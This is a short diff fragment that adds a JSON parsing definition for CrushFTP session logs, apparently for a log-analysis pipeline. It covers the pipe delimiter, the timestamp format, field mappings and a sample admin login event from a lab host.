+      "crushftp:sessionlogs"
+    ],
+    "header_type": "CrushFTP session log pipe-delimited",
+    "delimiter": "|",
+    "timestamp_format": "MM/dd/yyyy HH:mm:ss",
+    "cim_models": [
+      "File",
+      "Authentication"
+    ],
+    "field_mappings": {
+      "src": "client ip token",
+      "vendor_product": "CrushFTP"
+    },
+    "sample_events": {
+      "crushftp_session": "10/26/2026 14:58:14|netspout-sftp-lab|4|WEB|LOGIN |admin|session:2A|ip:10.0.9.9|port:49304|result success|"
+    }
   }
 ]
